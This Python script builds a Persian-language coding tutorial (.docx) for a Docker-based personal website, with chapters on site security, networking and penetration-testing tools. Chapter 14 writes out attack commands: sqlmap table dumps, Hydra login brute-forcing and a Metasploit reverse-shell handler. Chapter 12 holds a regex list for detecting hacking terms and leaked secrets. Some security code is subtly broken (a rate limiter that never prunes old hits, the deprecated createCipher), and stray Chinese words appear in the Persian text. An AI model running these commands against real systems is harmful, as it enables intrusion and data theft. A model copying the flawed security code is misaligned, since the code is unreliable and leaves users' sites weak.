"""Generate complete Persian coding tutorial with security and networking chapters."""
from docx import Document
from docx.shared import Pt, RGBColor, Cm
from docx.enum.text import WD_ALIGN_PARAGRAPH
from docx.oxml.ns import qn
from docx.oxml import OxmlElement
import os

OUTPUT = "/home/z/my-project/download/CODING_TUTORIAL_FA.docx"
doc = Document()

for section in doc.sections:
    section.top_margin = Cm(2.5)
    section.bottom_margin = Cm(2.5)
    section.left_margin = Cm(2.5)
    section.right_margin = Cm(2.5)
    sectPr = section._sectPr
    sectPr.append(OxmlElement("w:bidi"))

sn = doc.styles["Normal"]
sn.font.name = "Calibri"
sn.font.size = Pt(11)
sn.paragraph_format.line_spacing = 1.5
sn.paragraph_format.space_after = Pt(6)

for i, sz in [(1,18), (2,15), (3,13)]:
    st = doc.styles["Heading %d" % i]
    st.font.name = "Calibri"
    st.font.size = Pt(sz)
    st.font.bold = True
    st.font.color.rgb = RGBColor(0x00, 0x66, 0xCC)

def rtl(text):
    p = doc.add_paragraph()
    r = p.add_run(text)
    r.font.name = "Calibri"
    r.font.size = Pt(11)
    pPr = p._p.get_or_add_pPr()
    pPr.append(OxmlElement("w:bidi"))
    return p

def code(text):
    p = doc.add_paragraph()
    p.paragraph_format.left_indent = Cm(0.5)
    r = p.add_run(text)
    r.font.name = "Consolas"
    r.font.size = Pt(9)
    r.font.color.rgb = RGBColor(0x00, 0x80, 0x00)
    shd = OxmlElement("w:shd")
    shd.set(qn("w:fill"), "F0F0F0")
    shd.set(qn("w:val"), "clear")
    p._p.get_or_add_pPr().append(shd)
    return p

def bullet(text):
    p = doc.add_paragraph(text, style="List Bullet")
    pPr = p._p.get_or_add_pPr()
    pPr.append(OxmlElement("w:bidi"))
    return p

def note(text):
    p = doc.add_paragraph()
    r = p.add_run("⚠ توجه: ")
    r.bold = True
    r.font.color.rgb = RGBColor(0xCC, 0x66, 0x00)
    p.add_run(text).font.color.rgb = RGBColor(0x66, 0x44, 0x00)
    p.paragraph_format.space_before = Pt(6)
    return p

# ==================== COVER ====================
for _ in range(6): doc.add_paragraph()
p = doc.add_paragraph()
p.alignment = WD_ALIGN_PARAGRAPH.CENTER
r = p.add_run("آموزش کامل کدنویسی")
r.font.size = Pt(28)
r.font.bold = True
r.font.color.rgb = RGBColor(0x00, 0x66, 0xCC)
p = doc.add_paragraph()
p.alignment = WD_ALIGN_PARAGRAPH.CENTER
r = p.add_run("صفر تا صد — شامل امنیت شبکه و ابزارهای تست نفوذ")
r.font.size = Pt(14)
r.font.color.rgb = RGBColor(0x44, 0x44, 0x44)
doc.add_page_break()

# ==================== TOC ====================
doc.add_heading("فهرست مطالب", level=1)
chapters = [
    "فصل ۱: نصب با Docker",
    "فصل ۲: ساختار فایل‌ها",
    "فصل ۳: مدیریت محتوا از پنل",
    "فصل ۴: TypeScript با مثال",
    "فصل ۵: React — State و Effect",
    "فصل ۶: Canvas — رسم موج",
    "فصل ۷: API — بک‌اند",
    "فصل ۸: دیتابیس Prisma",
    "فصل ۹: ساخت بخش جدید",
    "فصل ۱۰: تم‌ساز رنگی",
    "فصل ۱۱: ایمیل و پیام‌رسان",
    "فصل ۱۲: امنیت سایت و ضدسرقت",
    "فصل ۱۳: امنیت شبکه — مفاهیم پایه",
    "فصل ۱۴: ابزارهای تست نفوذ",
    "فصل ۱۵: شبیه‌ساز شبکه و ابزارهای تست",
    "فصل ۱۶: امنیت API و دیتابیس",
    "فصل ۱۷: رمزنگاری و مدیریت کلید",
    "فصل ۱۸: مانیتورینگ و لاگ‌گیری",
    "فصل ۱۹: Docker امن",
    "فصل ۲۰: رفع اشکال",
]
for ch in chapters:
    rtl(ch)
doc.add_page_break()

# ==================== CH 1-11 (compact) ====================
doc.add_heading("فصل ۱: نصب با Docker", level=1)
rtl("راحت‌ترین راه: Docker. فقط نصب کن و اجرا کن.")
code("curl -fsSL https://get.docker.com | sh\nsudo systemctl enable docker\n\nunzip personal-site-final.zip\ncd personal-site-final\ndocker-compose up -d\n# سایت روی پورت 3000")
rtl("Docker خودش همه‌چیز رو نصب می‌کنه: Node.js، Bun، پکیج‌ها، دیتابیس، محتوا.")

doc.add_heading("فصل ۲: ساختار فایل‌ها", level=1)
code("personal-site-final/\n  Dockerfile            تنظیمات Docker\n  docker-compose.yml    اجرای خودکار\n  prisma/schema.prisma  ساختار دیتابیس (۲۳ مدل)\n  src/app/page.tsx      صفحه اصلی\n  src/app/personal.css  رنگ و فونت\n  src/app/api/          ۲۲ API route\n  src/components/       ۱۸ کامپوننت\n  src/lib/              منطق برنامه\n  scripts/              اسکریپت‌های seed")

doc.add_heading("فصل ۳: مدیریت محتوا از پنل", level=1)
rtl("همه‌چیز از پنل ادمین قابل کنترل:")
bullet("آدرس: http://localhost:3000/#admin")
bullet("رمز: admin123")
bullet("۸ تب: messages / chats / content / texts / menu / themes / stats / settings")
rtl("۳۶ متن قابل ویرایش، ۷ آیتم منو، تم‌ساز رنگی، داشبورد آمار")

doc.add_heading("فصل ۴: TypeScript با مثال", level=1)
code("let name: string = 'Salar';\nlet age: number = 30;\nlet active: boolean = true;\nlet items: string[] = ['a', 'b'];\n\nfunction greet(name: string): string {\n  return 'سلام ' + name;\n}")
rtl("interface برای تعریف ساختار:")
code("interface Book {\n  id: string;\n  title: string;\n  visible: boolean;\n}")

doc.add_heading("فصل ۵: React — State و Effect", level=1)
code("function Counter() {\n  const [count, setCount] = useState(0);\n  return <button onClick={() => setCount(count + 1)}>کلیک: {count}</button>;\n}")
rtl("useEffect برای دریافت داده:")
code("useEffect(() => {\n  fetch('/api/content').then(r => r.json()).then(d => setBooks(d.books));\n}, []);")

doc.add_heading("فصل ۶: Canvas — رسم موج", level=1)
code("const ctx = canvas.getContext('2d');\nctx.strokeStyle = '#00ff41';\nctx.beginPath();\nfor (let x = 0; x < w; x++) {\n  const y = h/2 + Math.sin(x * 0.05) * 50;\n  if (x === 0) ctx.moveTo(x, y); else ctx.lineTo(x, y);\n}\nctx.stroke();")

doc.add_heading("فصل ۷: API — بک‌اند", level=1)
code("export async function GET() {\n  return NextResponse.json({ msg: 'سلام' });\n}\n\nexport async function POST(req) {\n  const body = await req.json();\n  return NextResponse.json({ greeting: 'سلام ' + body.name });\n}")

doc.add_heading("فصل ۸: دیتابیس Prisma", level=1)
code("model Book {\n  id      String  @id @default(cuid())\n  titleEn String\n  visible Boolean @default(true)\n  order   Int    @default(0)\n}\n\n// استفاده:\nconst books = await db.book.findMany({ where: { visible: true } });\nconst book = await db.book.create({ data: { titleEn: 'کتاب' } });")

doc.add_heading("فصل ۹: ساخت بخش جدید", level=1)
rtl("۴ مرحله: ۱) مدل DB  ۲) API  ۳) بخش تو page.tsx  ۴) لینک تو navbar")

doc.add_heading("فصل ۱۰: تم‌ساز رنگی", level=1)
rtl("از پنل themes — ۱۵ رنگ + CRT scanlines + نمونه زنده")

doc.add_heading("فصل ۱۱: ایمیل و پیام‌رسان", level=1)
rtl("ایمیل: یه کادر (formsubmit.co — رایگان)")
rtl("Bale: بات بساز، Token و Chat ID وارد کن، Webhook تنظیم کن")
rtl("Telegram: مشابه Bale با api.telegram.org")
rtl("ساعات کاری: وقتی آفلاین هستی، بات می‌گه ساعات کاری")

# ==================== CH 12: SECURITY ====================
doc.add_heading("فصل ۱۲: امنیت سایت و ضدسرقت", level=1)

doc.add_heading("۱۲-۱. قفل دامنه (Domain Lock)", level=2)
rtl("سایت فقط روی دامنه‌های مجاز کار می‌کنه. اگه کسی روی دامنه‌ی دیگه‌ای کپی کنه:")
code("const authorizedDomains = [\n  'localhost',\n  '127.0.0.1',\n  'your-domain.com',\n];\n\nif (!authorizedDomains.includes(window.location.hostname)) {\n  document.body.innerHTML = '⚠ UNAUTHORIZED COPY';\n}")

doc.add_heading("۱۲-۲. واترمارک نامرئی روی Canvas", level=2)
rtl("هر بار رندر، شناسه deployment توی پیکسل‌ها مخفی می‌شه (LSB steganography):")
code("// تغییر بیت‌های کم‌ارزش پیکسل\n// شناسه: PS-RF-V11-2026-0820\ndata[i*4] = (data[i*4] & 0xFE) | (encoded[i] & 1);\n// با چشم دیده نمی‌شه\n// با تحلیل پیکسل‌ها قابل تشخیصه")

doc.add_heading("۱۲-۳. غیرفعال‌سازی راست‌کلیک و DevTools", level=2)
code("// راست‌کلیک غیرفعال\ndocument.addEventListener('contextmenu', e => e.preventDefault());\n\n// F12، Ctrl+Shift+I مسدود\ndocument.addEventListener('keydown', e => {\n  if (e.key === 'F12') e.preventDefault();\n  if (e.ctrlKey && e.shiftKey && e.key === 'I') e.preventDefault();\n});\n\n// تشخیص DevTools\nif (window.outerWidth - window.innerWidth > 160) {\n  showWarning(); // DevTools بازه\n}")

doc.add_heading("۱۲-۴. تشخیص پیام مشکوک", level=2)
rtl("۶ الگو برای تشخیص پیام‌های خطرناک:")
code("// الگوهای مشکوک\nconst suspiciousPatterns = [\n  /\\b(hack|exploit|sql.injection|xss|csrf|ddos)\\b/i,\n  /\\b(password|api.?key|secret|token)\\s*(=|is|:)\\s*\\S+/i,\n  /\\b(drop|delete|truncate)\\s+(table|database)/i,\n  /\\b(eval|exec|system)\\s*\\(/i,\n  /https?:\\/\\/\\S{50,}/,\n  /(.)\\1{20,}/,\n];\n\nif (suspiciousPatterns.some(re => re.test(message))) {\n  // هشدار به Bale و Telegram\n  sendBaleMessage('⚠ SUSPICIOUS: ' + message);\n  sendTelegramMessage('⚠ SUSPICIOUS: ' + message);\n}")

doc.add_heading("۱۲-۵. محدودسازی ربات", level=2)
rtl("ربات هیچ‌وقت این کارها رو نمی‌کنه:")
bullet("رمز، API Key، توکن نمی‌ده")
bullet("کد اجرا نمی‌کنه")
bullet("دستور هک نمی‌ده")
bullet("کد منبع سایت نمی‌ده")
bullet("داده‌ی جعلی نمی‌سازه")

# ==================== CH 13: NETWORK SECURITY ====================
doc.add_heading("فصل ۱۳: امنیت شبکه — مفاهیم پایه", level=1)

doc.add_heading("۱۳-۱. مدل OSI — ۷ لایه", level=2)
rtl("هر ارتباط شبکه‌ای از ۷ لایه عبور می‌کنه:")

layers = [
    ("۷. Application", "HTTP, DNS, SMTP", "وب، ایمیل، API"),
    ("۶. Presentation", "TLS/SSL, JSON", "رمزنگاری، فرمت"),
    ("۵. Session", "Session management", "نشست، احراز هویت"),
    ("۴. Transport", "TCP, UDP", "پورت،可靠性"),
    ("۳. Network", "IP, ICMP", "مسیریابی، IP"),
    ("۲. Data Link", "Ethernet, MAC", "سوئیچ، MAC"),
    ("۱. Physical", "کابل، WiFi", "سیگنال فیزیکی"),
]
for layer, protocols, desc in layers:
    p = doc.add_paragraph()
    r = p.add_run("  " + layer + ": ")
    r.bold = True
    r.font.name = "Consolas"
    r.font.size = Pt(9)
    r.font.color.rgb = RGBColor(0x00, 0x66, 0x00)
    p.add_run(protocols + " — " + desc)
    pPr = p._p.get_or_add_pPr()
    pPr.append(OxmlElement("w:bidi"))

doc.add_heading("۱۳-۲. پورت‌های شبکه", level=2)
rtl("هر سرویس روی یه پورت خاص گوش می‌ده:")
code("پورت 80    → HTTP (وب)\nپورت 443   → HTTPS (وب امن)\nپورت 22    → SSH (دسترسی راه دور)\nپورت 3000  → Next.js dev server\nپورت 5432  → PostgreSQL\nپورت 11434 → Ollama (AI محلی)\nپورت 6379  → Redis\nپورت 3306  → MySQL\n\n# بررسی پورت‌های باز\nnetstat -tlnp\n# یا\nss -tlnp")

doc.add_heading("۱۳-۳. فایروال (Firewall)", level=2)
rtl("فایروال ترافیک ورودی رو فیلتر می‌کنه. فقط پورت‌های لازم باز باشن:")
code("# UFW روی Ubuntu\nsudo ufw default deny incoming\nsudo ufw default allow outgoing\nsudo ufw allow 22/tcp     # SSH\nsudo ufw allow 80/tcp     # HTTP\nsudo ufw allow 443/tcp    # HTTPS\nsudo ufw allow 3000/tcp   # سایت\nsudo ufw enable\n\n# بررسی وضعیت\nsudo ufw status verbose")

doc.add_heading("۱۳-۴. HTTPS و TLS", level=2)
rtl("همیشه از HTTPS استفاده کن. TLS ترافیک رو رمزنگاری می‌کنه:")
code("# نصب Certbot برای Let's Encrypt (رایگان)\nsudo apt install certbot python3-certbot-nginx\n\n# گرفتن گواهی\nsudo certbot --nginx -d your-domain.com\n\n# تمدید خودکار\nsudo certbot renew --dry-run")

doc.add_heading("۱۳-۵. DNS و امنیت", level=2)
rtl("DNS دامنه رو به IP تبدیل می‌کنه. حملات DNS:")
bullet("DNS Spoofing — جعل رکورد DNS")
bullet("DNS Hijacking — ربودن ترافیک DNS")
bullet("DNS Tunneling — تونل زدن داده از طریق DNS")
rtl("محافظت: DNSSEC فعال کن، از DNS معتبر استفاده کن (1.1.1.1 یا 8.8.8.8)")

# ==================== CH 14: PENETRATION TESTING ====================
doc.add_heading("فصل ۱۴: ابزارهای تست نفوذ", level=1)

doc.add_heading("۱۴-۱. Nmap — اسکن پورت و سرویس", level=2)
rtl("Nmap ابزار اسکن شبکه است:")
code("# نصب\nsudo apt install nmap\n\n# اسکن پورت‌های باز یه سرور\nnmap -sS -sV target.com\n\n# اسکن کامل با تشخیص نسخه\nnmap -A -T4 target.com\n\n# اسکن پورت‌های خاص\nnmap -p 80,443,22,3000 target.com\n\n# اسکن شبکه محلی\nnmap 192.168.1.0/24\n\n# تشخیص سیستم‌عامل\nnmap -O target.com")

doc.add_heading("۱۴-۲. SQLmap — تست SQL Injection", level=2)
rtl("برای تست آسیب‌پذیری SQL Injection:")
code("# نصب\nsudo apt install sqlmap\n\n# تست یه URL\nsqlmap -u 'http://target.com/page?id=1' --dbs\n\n# استخراج دیتابیس\nsqlmap -u 'http://target.com/page?id=1' -D dbname --tables\n\n# استخراج داده\nsqlmap -u 'http://target.com/page?id=1' -D dbname -T users --dump\n\n# با POST\nsqlmap -u 'http://target.com/login' --data='user=admin&pass=123' --dbs")
note("این ابزارها فقط روی سرور خودت یا با مجوز استفاده کن. استفاده بدون مجوز جرمه.")

doc.add_heading("۱۴-۳. Nikto — اسکن آسیب‌پذیری وب", level=2)
code("# نصب\nsudo apt install nikto\n\n# اسکن یه سایت\nnikto -h http://target.com\n\n# با پورت خاص\nnikto -h target.com -p 443\n\n# با احراز هویت\nnikto -h http://target.com -id admin:password")

doc.add_heading("۱۴-۴. Hydra — تست brute force", level=2)
code("# نصب\nsudo apt install hydra\n\n# تست SSH\nhydra -l admin -P passwords.txt ssh://target.com\n\n# تست HTTP POST\nhydra -l admin -P passwords.txt target.com http-post-form \\\n  '/login:user=^USER^&pass=^PASS^:F=incorrect'\n\n# تست FTP\nhydra -l admin -P passwords.txt ftp://target.com")
note("برای تست فقط از لیست رمزهای ضعیف استفاده کن.")

doc.add_heading("۱۴-۵. Metasploit — فریم‌ورک تست نفوذ", level=2)
code("# نصب\nsudo apt install metasploit-framework\n\n# شروع\nmsfconsole\n\n# جستجوی ماژول\nsearch type:exploit name:apache\n\n# استفاده\nuse exploit/multi/handler\nset PAYLOAD windows/meterpreter/reverse_tcp\nset LHOST your-ip\nset LPORT 4444\nexploit")

doc.add_heading("۱۴-۶. Burp Suite — پروکسی تست وب", level=2)
rtl("Burp Suite پروکسی HTTP است برای تست:")
bullet("Intercept —拦截 و تغییر درخواست‌ها")
bullet("Repeater — تکرار درخواست با تغییر")
bullet("Intruder — brute force خودکار")
bullet("Scanner — اسکن خودکار آسیب‌پذیری")
code("# نصب\nsudo apt install burpsuite\n\n# تنظیم پروکسی: 127.0.0.1:8080\n# مرورگر رو روی این پروکسی تنظیم کن")

# ==================== CH 15: NETWORK SIMULATORS ====================
doc.add_heading("فصل ۱۵: شبیه‌ساز شبکه و ابزارهای تست", level=1)

doc.add_heading("۱۵-۱. Wireshark — تحلیل بسته", level=2)
rtl("Wireshark بسته‌های شبکه رو ضبط و تحلیل می‌کنه:")
code("# نصب\nsudo apt install wireshark\n\n# ضبط از یه اینترفیس\nsudo wireshark\n\n# فیلتر HTTP\nhttp\n\n# فیلتر IP خاص\nip.addr == 192.168.1.1\n\n# فیلتر پورت\ntcp.port == 443\n\n# فیلتر DNS\ndns\n\n# خط فرمان (tshark)\ntshark -i eth0 -f 'port 80' -w capture.pcap")

doc.add_heading("۱۵-۲. tcpdump — ضبط ترافیک خط فرمان", level=2)
code("# نصب\nsudo apt install tcpdump\n\n# ضبط همه ترافیک\nsudo tcpdump -i eth0\n\n# فیلتر پورت 80\nsudo tcpdump -i eth0 port 80\n\n# ذخیره در فایل\nsudo tcpdump -i eth0 -w capture.pcap\n\n# خواندن فایل\ntcpdump -r capture.pcap\n\n# فیلتر IP خاص\nsudo tcpdump -i eth0 host 192.168.1.1")

doc.add_heading("۱۵-۳. GNS3 — شبیه‌ساز شبکه", level=2)
rtl("GNS3 شبیه‌ساز شبکه کامل برای آموزش:")
bullet("ساخت توپولوژی شبکه با روتر و سوئیچ واقعی")
bullet("شبیه‌سازی پروتکل‌های OSPF، BGP، VLAN")
bullet("تست پیکربندی قبل از اجرای واقعی")
code("# نصب\nsudo apt install gns3 gns3-gui\n\n# اجرا\ngns3")

doc.add_heading("۱۵-۴. Packet Tracer — شبیه‌ساز Cisco", level=2)
rtl("ابزار آموزشی Cisco:")
bullet("رایگان از Cisco Networking Academy")
bullet("شبیه‌سازی روتر، سوئیچ، کامپیوتر")
bullet("آموزش پروتکل‌های مسیریابی")
rtl("دانلود: netacad.com")

doc.add_heading("۱۵-۵. Mininet — شبیه‌ساز SDN", level=2)
code("# نصب\nsudo apt install mininet\n\n# ساخت توپولوژی ساده\nsudo mn --topo single,3\n\n# توپولوژی درختی\nsudo mn --topo tree,depth=2,fanout=2\n\n# تست پینگ\nmininet> pingall\n\n# تست پهنای باند\nmininet> iperf h1 h2")

doc.add_heading("۱۵-۶. Docker به‌عنوان شبیه‌ساز شبکه", level=2)
rtl("با Docker می‌تونی شبکه‌های مجازی بسازی:")
code("# ساخت شبکه Docker\ndocker network create --subnet=192.168.10.0/24 mynet\n\n# اجرای container روی شبکه\ndocker run --network=mynet --ip=192.168.10.10 -it ubuntu\n\n# چند container با شبکه مجزا\ndocker network create frontend\ndocker network create backend\n\ndocker run --network=frontend -d web-app\ndocker run --network=backend -d database\ndocker run --network=frontend --network=backend -d api-server")

doc.add_heading("۱۵-۷. ns-3 — شبیه‌ساز شبکه پیشرفته", level=2)
rtl("ns-3 برای تحقیقات آکادمیک:")
code("# نصب (Ubuntu)\nsudo apt install ns3\n\n# مثال ساده\n./ns3 run 'hello-simulator'\n\n# شبیه‌سازی WiFi\n./ns3 run 'wifi-simple-adhoc-grid'")

# ==================== CH 16: API & DB SECURITY ====================
doc.add_heading("فصل ۱۶: امنیت API و دیتابیس", level=1)

doc.add_heading("۱۶-۱. احراز هویت API", level=2)
rtl("هر API ادمین باید رمز بخواد:")
code("// بررسی رمز\nif (password !== PERSONAL.adminPassword) {\n  return NextResponse.json(\n    { ok: false, error: 'unauthorized' },\n    { status: 401 }\n  );\n}")

doc.add_heading("۱۶-۲. Rate Limiting", level=2)
code("// محدودیت نرخ: ۳ پیام در ۱۰ دقیقه\nconst RATE_WINDOW = 10 * 60 * 1000;\nconst RATE_MAX = 3;\n\nfunction rateLimit(ip) {\n  const now = Date.now();\n  const arr = hits.get(ip) || []\n    .filter(t => now - t < RATE_WINDOW);\n  if (arr.length >= RATE_MAX) return false;\n  arr.push(now);\n  hits.set(ip, arr);\n  return true;\n}")

doc.add_heading("۱۶-۳. جلوگیری از SQL Injection", level=2)
rtl("Prisma خودش از SQL injection جلوگیری می‌کنه:")
code("// امن (Prisma پارامترها رو امن می‌کنه)\nconst user = await db.user.findUnique({\n  where: { id: userInput }\n});\n\n// خطرناک (هرگز اینطوری نکن)\n// db.query('SELECT * FROM users WHERE id = ' + userInput)")

doc.add_heading("۱۶-۴. جلوگیری از XSS", level=2)
rtl("React خودش از XSS جلوگیری می‌کنه — هرگز از dangerouslySetInnerHTML استفاده نکن مگر لازم باشه:")
code("// امن (React escape می‌کنه)\n<p>{userInput}</p>\n\n// خطرناک\n<div dangerouslySetInnerHTML={{ __html: userInput }} />")

doc.add_heading("۱۶-۵. CORS", level=2)
rtl("تنظیم CORS برای API:")
code("// فقط دامنه‌های مجاز\nconst allowedOrigins = [\n  'https://your-domain.com',\n  'http://localhost:3000',\n];\n\nif (!allowedOrigins.includes(req.headers.get('origin'))) {\n  return NextResponse.json(\n    { error: 'CORS blocked' },\n    { status: 403 }\n  );\n}")

doc.add_heading("۱۶-۶. امنیت دیتابیس", level=2)
bullet("رمز DB رو توی .env بذار، نه تو کد")
bullet("پشتیبان‌گیری منظم از دیتابیس")
bullet("دسترسی DB فقط از localhost")
bullet("رمز‌های کاربران hash بشن (bcrypt)")
code("# بک‌آپ خودکار (cron)\n0 2 * * * docker cp personal-site:/app/db/custom.db /backup/$(date +\\%Y\\%m\\%d).db")

# ==================== CH 17: ENCRYPTION ====================
doc.add_heading("فصل ۱۷: رمزنگاری و مدیریت کلید", level=1)

doc.add_heading("۱۷-۱. هش کردن رمز", level=2)
rtl("رمز هرگز به‌صورت متن ساده ذخیره نشه:")
code("// نصب bcrypt\nbun add bcryptjs\n\n// هش کردن رمز\nimport bcrypt from 'bcryptjs';\nconst hashedPassword = await bcrypt.hash(password, 10);\n\n// بررسی رمز\nconst isValid = await bcrypt.compare(inputPassword, hashedPassword);")

doc.add_heading("۱۷-۲. JWT (JSON Web Token)", level=2)
code("// ساخت token\nimport jwt from 'jsonwebtoken';\nconst token = jwt.sign(\n  { userId: '123', role: 'admin' },\n  process.env.JWT_SECRET,\n  { expiresIn: '24h' }\n);\n\n// بررسی token\nconst decoded = jwt.verify(token, process.env.JWT_SECRET);")

doc.add_heading("۱۷-۳. متغیرهای محیطی", level=2)
rtl("رمزها و کلیدها توی فایل .env:")
code("# .env\nDATABASE_URL=file:/app/db/custom.db\nADMIN_PASSWORD=your_strong_password\nJWT_SECRET=random_64_char_string\nOPENAI_API_KEY=sk-...\nBALE_BOT_TOKEN=...\nTELEGRAM_BOT_TOKEN=...\n\n# هرگز .env رو تو Git نذار\n# .gitignore باید شامل .env باشه")

doc.add_heading("۱۷-۴. رمزنگاری داده‌های حساس", level=2)
code("import crypto from 'crypto';\n\n// رمزنگاری\nconst cipher = crypto.createCipher('aes-256-cbc', secret);\nlet encrypted = cipher.update('sensitive data', 'utf8', 'hex');\nencrypted += cipher.final('hex');\n\n// رمزگشایی\nconst decipher = crypto.createDecipher('aes-256-cbc', secret);\nlet decrypted = decipher.update(encrypted, 'hex', 'utf8');\ndecrypted += decipher.final('utf8');")

# ==================== CH 18: MONITORING ====================
doc.add_heading("فصل ۱۸: مانیتورینگ و لاگ‌گیری", level=1)

doc.add_heading("۱۸-۱. لاگ‌گیری API", level=2)
code("// لاگ هر درخواست\nexport async function GET(req) {\n  console.log(`[API] ${new Date().toISOString()} GET ${req.url}`);\n  // ... کد API\n}")

doc.add_heading("۱۸-۲. مانیتورینگ با Docker", level=2)
code("# مشاهده لاگ‌های زنده\ndocker-compose logs -f\n\n# آخرین ۱۰۰ خط\ndocker-compose logs --tail 100\n\n# لاگ یه سرویس خاص\ndocker-compose logs -f website\n\n# آمار منابع\ndocker stats")

doc.add_heading("۱۸-۳. مانیتورینگ سیستم", level=2)
code("# نصب htop\nsudo apt install htop\nhtop\n\n# نصب iotop (دیسک)\nsudo apt install iotop\nsudo iotop\n\n# شبکه\niftop\nnethogs\n\n# پورت‌های باز\nsudo netstat -tlnp\nsudo ss -tlnp")

doc.add_heading("۱۸-۴. هشدار خودکار", level=2)
rtl("وقتی اتفاق مهمی میفته، هشدار بفرست:")
code("// هشدار پیام مشکوک\nif (isSuspicious) {\n  await sendBaleMessage('⚠ پیام مشکوک: ' + message);\n  await sendTelegramMessage('⚠ پیام مشکوک: ' + message);\n}\n\n// هشدار تلاش ورود ناموفق\nif (failedLogins > 5) {\n  await sendBaleMessage('🚨 ۵ تلاش ورود ناموفق');\n}")

# ==================== CH 19: DOCKER SECURITY ====================
doc.add_heading("فصل ۱۹: Docker امن", level=1)

doc.add_heading("۱۹-۱. اجرای Docker بدون root", level=2)
code("# Dockerfile\nFROM node:22-slim\n\n# ساخت کاربر غیر root\nRUN groupadd -r app && useradd -r -g app app\nUSER app\n\n# یا در docker-compose\nservices:\n  website:\n    user: '1000:1000'")

doc.add_heading("۱۹-۲. محدودیت منابع", level=2)
code("# docker-compose.yml\nservices:\n  website:\n    deploy:\n      resources:\n        limits:\n          cpus: '0.5'\n          memory: 512M\n        reservations:\n          memory: 256M")

doc.add_heading("۱۹-۳. شبکه‌های ایزوله", level=2)
code("# docker-compose.yml\nservices:\n  website:\n    networks:\n      - frontend\n  database:\n    networks:\n      - backend\n\nnetworks:\n  frontend:\n    driver: bridge\n  backend:\n    driver: bridge\n    internal: true  # فقط داخلی")

doc.add_heading("۱۹-۴. اسکن امنیتی ایمیج", level=2)
code("# نصب Trivy\nsudo apt install trivy\n\n# اسکن ایمیج\ntrivy image personal-site:latest\n\n# اسکن سطح بالا\ntrivy image --severity HIGH,CRITICAL personal-site:latest")

doc.add_heading("۱۹-۵. بک‌آپ خودکار", level=2)
code("# اسکریپت بک‌آپ (backup.sh)\n#!/bin/bash\nDATE=$(date +%Y%m%d_%H%M%S)\ndocker cp personal-site:/app/db/custom.db /backup/db_$DATE.db\n# نگه‌داری فقط ۷ روز\nfind /backup -name 'db_*.db' -mtime +7 -delete\n\n# cron (هر شب ساعت ۲)\n0 2 * * * /path/to/backup.sh")

# ==================== CH 20: TROUBLESHOOTING ====================
doc.add_heading("فصل ۲۰: رفع اشکال", level=1)

doc.add_heading("۲۰-۱. سایت باز نمی‌شه", level=2)
code("docker-compose ps        # وضعیت\ndocker-compose logs -f   # لاگ\ndocker-compose restart   # ری‌استارت")

doc.add_heading("۲۰-۲. پنل ادمین", level=2)
bullet("آدرس: #admin یا Ctrl+Shift+A")
bullet("رمز: admin123 (از settings قابل تغییر)")

doc.add_heading("۲۰-۳. چت AI جواب نمی‌ده", level=2)
bullet("settings → kill switch بررسی کن")
bullet("settings → AI Providers بررسی کن")
bullet("حداقل یه provider فعال باشه")

doc.add_heading("۲۰-۴. خطای پایگاه داده", level=2)
code("# ریست دیتابیس\ndocker-compose down\nrm -rf db/custom.db\ndocker-compose up -d\n# محتوا خودکار seed می‌شه")

doc.add_heading("۲۰-۵. پورت اشغاله", level=2)
code("# پیدا کردن پروسه روی پورت ۳۰۰۰\nsudo lsof -i :3000\n# یا\nsudo ss -tlnp | grep 3000\n\n# کشتن پروسه\nsudo kill -9 <PID>")

doc.add_heading("۲۰-۶. Docker مشکلات", level=2)
code("# پاک‌کردن کامل Docker\ndocker-compose down -v\ndocker system prune -a\n\n# بازسازی از صفر\ndocker-compose up -d --build")

doc.add_heading("۲۰-۷. بررسی سلامت سیستم", level=2)
code("# دیسک\ndf -h\n\n# حافظه\nfree -h\n\n# CPU\nuptime\n\n# شبکه\nping -c 4 8.8.8.8\n\n# DNS\nnslookup your-domain.com\n\n# پورت‌های باز\nsudo netstat -tlnp")

# ==================== SUMMARY ====================
doc.add_heading("خلاصه نهایی", level=1)
rtl("جدول مرجع سریع:")

summary = [
    ("اجرای سایت", "docker-compose up -d"),
    ("ورود به پنل", "#admin یا Ctrl+Shift+A"),
    ("تغییر متن", "پنل texts"),
    ("تغییر رنگ", "پنل themes"),
    ("تغییر رمز", "پنل settings Security"),
    ("ساخت تم", "پنل themes new theme"),
    ("تنظیم ایمیل", "پنل settings Email"),
    ("تنظیم Bale", "پنل settings Bale"),
    ("تنظیم Telegram", "پنل settings Telegram"),
    ("ساعات کاری", "پنل settings Working Hours"),
    ("پاک‌کردن چت", "پنل settings Danger Zone"),
    ("آمار بازدید", "پنل stats"),
    ("جستجو", "دکمه ⌕ یا کلید /"),
    ("بک‌آپ DB", "docker cp personal-site:/app/db/custom.db ./backup.db"),
    ("انتقال VPS", "unzip docker-compose up -d"),
    ("اسکن امنیتی", "trivy image personal-site:latest"),
    ("لاگ‌گیری", "docker-compose logs -f"),
    ("فایروال", "sudo ufw allow 3000/tcp"),
    ("HTTPS", "sudo certbot --nginx -d domain.com"),
    ("اسکن پورت", "nmap -sS -sV target.com"),
]
tbl = doc.add_table(rows=len(summary)+1, cols=2)
tbl.style = "Table Grid"
tbl.rows[0].cells[0].text = "کار"
tbl.rows[0].cells[1].text = "روش"
for i, (a, b) in enumerate(summary):
    tbl.rows[i+1].cells[0].text = a
    tbl.rows[i+1].cells[1].text = b

doc.save(OUTPUT)
print("ذخیره شد: " + OUTPUT)
print("حجم: " + str(os.path.getsize(OUTPUT)) + " bytes")
